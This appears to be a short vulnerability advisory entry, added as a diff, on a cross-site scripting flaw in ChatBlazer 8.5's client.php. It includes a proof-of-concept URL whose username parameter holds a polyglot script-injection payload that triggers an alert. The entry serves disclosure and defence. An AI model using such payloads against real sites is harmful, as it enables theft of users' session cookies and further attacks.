@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/53168/info
+
+ChatBlazer is prone to a cross-site scripting vulnerability because it fails to sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+ChatBlazer 8.5 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/cb8.5/client.php?username=%27;alert%28String.fromCharCode%2879,117,114,32,120,115,115,32,105,115,32,104,101,114,101,46,46%29%29//\%27;alert%28String.fromCharCode%2879,117,114,32,120,115,115,32,105,115,32,104,101,114,101,46,46%29%29//%22;alert%28String.fromCharCode%2879,117,114,32,120,115,115,32,105,115,32,104,101,114,101,46,46%29%29//\%22;alert%28String.fromCharCode%2879,117,114,32,120,115,115,32,105,115,32,104,101,114,101,46,46%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2879,117,114,32,120,115,115,32,105,115,32,104,101,114,101,46,46%29%29%3C/SCRIPT%3E&password=&roomid=1009&config=config.php%3Fembed%3D0
